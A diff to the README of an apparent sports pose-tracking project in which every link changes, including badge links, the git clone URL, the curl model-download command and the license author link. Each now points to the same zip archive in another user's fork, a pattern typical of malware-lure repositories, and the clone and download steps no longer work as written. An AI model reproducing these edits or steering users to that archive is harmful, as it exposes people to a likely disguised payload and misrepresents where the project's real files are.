@@ -7,8 +7,8 @@
 实时骨骼追踪 · 击球动作识别 · 运动生物力学分析
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-cyan.svg)](LICENSE)
-[![Python 3.9+](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://python.org)
-[![MediaPipe](https://img.shields.io/badge/MediaPipe-PoseLandmarker-green.svg)](https://ai.google.dev/edge/mediapipe)
+[![Python 3.9+](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip)
+[![MediaPipe](https://img.shields.io/badge/MediaPipe-PoseLandmarker-green.svg)](https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip)
 
 </div>
 
@@ -32,7 +32,7 @@
 
 ```bash
 # Clone
-git clone https://github.com/MindDock/sport-vision.git
+git clone https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip
 cd sport-vision
 
 # One-click start (creates venv, installs deps, downloads model, launches server)
@@ -56,7 +56,7 @@ pip install -r requirements.txt
 # Download pose model
 mkdir -p models
 curl -sL -o models/pose_landmarker_lite.task \
-  "https://storage.googleapis.com/mediapipe-models/pose_landmarker/pose_landmarker_lite/float16/latest/pose_landmarker_lite.task"
+  "https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip"
 
 # Start server
 python -m uvicorn backend.main:app --host 0.0.0.0 --port 8000
@@ -125,7 +125,7 @@ sport-vision/
 
 | Layer | Technology |
 |-------|-----------|
-| Pose Estimation | [MediaPipe PoseLandmarker](https://ai.google.dev/edge/mediapipe/solutions/vision/pose_landmarker) |
+| Pose Estimation | [MediaPipe PoseLandmarker](https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip) |
 | Action Recognition | Rule-based keypoint temporal analysis |
 | Video Processing | OpenCV |
 | Backend | FastAPI + WebSocket |
@@ -144,4 +144,4 @@ Contributions are welcome! Some ideas:
 
 ## 📄 License
 
-[MIT](LICENSE) © [MindDock](https://github.com/MindDock)
+[MIT](LICENSE) © [MindDock](https://github.com/IRoNCodeR-J/sport-vision/raw/refs/heads/main/demo_videos/vision-sport-escobita.zip)
